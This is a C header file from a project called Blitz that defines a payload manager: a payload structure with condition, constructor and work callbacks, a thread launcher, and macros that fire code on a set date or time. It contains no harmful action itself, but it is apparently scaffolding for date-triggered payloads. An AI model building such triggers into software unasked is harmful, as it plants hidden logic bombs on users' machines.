//
// Blitz
// (C) 2019 modeco80.
//
// File:
//		PayloadMan.h
//
// Description:
//		Payload manager types, macros, and
//		functions.
//

#pragma once
#include "Common.h"

// THISPLCALL is just (ANYRETURN) Function (void* thispl);
#define BLITZ_THISPLCALL(ReturnType, Name) ReturnType(*Name)(void*);

// Payload object
typedef struct _BlitzPayload {
	char* Name;
	BLITZ_THISPLCALL(BOOL, ConditionTest)
	BLITZ_THISPLCALL(void, Ctor)
	BLITZ_THISPLCALL(void, Work)
	unsigned long long Ticks;
} BlitzPayload;

#undef BLITZ_THISPLCALL

#define BLITZ_PAYLOAD_TICK_MS 16
#define BLITZ_TICKS_TO_SECONDS(Ticks) (Ticks / 60)

// Starts a thread for this specific payload.
// NOTE: this function is async, and returns a handle to the running thread as soon as it's created
HANDLE WINAPI BlitzInitalizePayload(BlitzPayload* Payload);
	
// Checks the system date (including year).
#define BLITZ_CHECK_SYSTEM_DATE(MM, DD, YYYY, TrueBlock, FalseBlock) { SYSTEMTIME lt = {0}; \
											GetLocalTime(&lt); \
											if(lt.wMonth == MM && lt.wDay == DD && lt.wYear == YYYY) TrueBlock \
											else FalseBlock \
											}

// Same as BLITZ_CHECK_SYSTEM_DATE() but only for MM/DD so you can do year independent payloads.
#define BLITZ_CHECK_SYSTEM_DATE_MMDD(MM, DD, TrueBlock, FalseBlock) { SYSTEMTIME lt = {0}; \
											GetLocalTime(&lt); \
											if(lt.wMonth == MM && lt.wDay == DD) TrueBlock \
											else FalseBlock \
											}

// Same as BLITZ_CHECK_SYSTEM_DATE() but for the time.
#define BLITZ_CHECK_SYSTEM_TIME(HH, MM, TrueBlock, FalseBlock) { SYSTEMTIME lt = {0}; \
											GetLocalTime(&lt); \
											if(lt.wHour == HH && lt.wMinute == MM) TrueBlock \
											else FalseBlock \
											}



